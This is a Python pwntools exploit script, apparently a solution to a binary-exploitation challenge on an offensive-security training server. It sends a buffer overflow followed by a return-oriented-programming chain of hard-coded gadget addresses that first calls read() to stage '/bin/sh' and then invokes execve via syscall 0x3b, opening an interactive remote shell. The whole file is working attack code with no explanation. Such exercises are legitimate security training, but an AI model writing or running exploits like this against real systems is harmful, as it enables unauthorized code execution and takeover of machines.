#! /usr/bin/python3
import pwn
import time



pwn.context.terminal = ['tmux', 'split-window', '-h'] #(si può usare screen)
#r = pwn.process("./emptyspaces")
#pwn.gdb.attach(r, '''
#ni 8
#''' )
pwn.context.log_level="DEBUG"
pwn.context.arch = "amd64"
r=pwn.remote("bin.training.offdef.it",4006)
r.recv()
mov_rdi_rsi=0x000000000047360c
lea_rax_rdipiurax=0x0000000000440417+0xd
la_bomba=0x0000000000446e99
mov_rcx_rdx=0x000000000044769e+9
pop_rsi=0x0000000000410133
pop_rdx=0x000000000044bd36
pop_rax=0x00000000004155a4
syscall=0x0000000000474dc5
pop_rdi=0x0000000000400696
pop_rdx_pop_rsi=0x000000000044bd59

exploit = 4*b'\x00'
exploit += b'/////bin/sh\x00'
exploit += (64-16)*b'\x41'+8*b'\x00'
exploit += pwn.packing.p64(pop_rax, sign="unsigned", endian="little")
exploit += pwn.packing.p64(0x0, sign="unsigned", endian="little")
exploit += pwn.packing.p64(pop_rdx, sign="unsigned", endian="little")
exploit += pwn.packing.p64(0x400, sign="unsigned", endian="little")
exploit += pwn.packing.p64(pop_rdi, sign="unsigned", endian="little")
exploit += pwn.packing.p64(0x0, sign="unsigned", endian="little")
exploit += pwn.packing.p64(syscall, sign="unsigned", endian="little")
r.send(exploit)
input("wait")
exploit = 4*b'/'
exploit += b'/////bin/sh\x00'
exploit += (64-16)*b'\x41'+8*b'\x00'
exploit += pwn.packing.p64(pop_rax, sign="unsigned", endian="little")
exploit += pwn.packing.p64(0x0, sign="unsigned", endian="little")
exploit += pwn.packing.p64(pop_rdx, sign="unsigned", endian="little")
exploit += pwn.packing.p64(0x400, sign="unsigned", endian="little")
exploit += pwn.packing.p64(pop_rdi, sign="unsigned", endian="little")
exploit += pwn.packing.p64(0x0, sign="unsigned", endian="little")
exploit += pwn.packing.p64(syscall, sign="unsigned", endian="little")
exploit += pwn.packing.p64(mov_rdi_rsi, sign="unsigned", endian="little")
exploit += pwn.packing.p64(pop_rsi, sign="unsigned", endian="little")
exploit += pwn.packing.p64(0, sign="unsigned", endian="little")
exploit += pwn.packing.p64(pop_rdx, sign="unsigned", endian="little")
exploit += pwn.packing.p64(0x0, sign="unsigned", endian="little")
exploit += pwn.packing.p64(pop_rax, sign="unsigned", endian="little")
exploit += pwn.packing.p64(0x3b, sign="unsigned", endian="little")
exploit += pwn.packing.p64(syscall, sign="unsigned", endian="little")

r.send(exploit)
r.interactive()
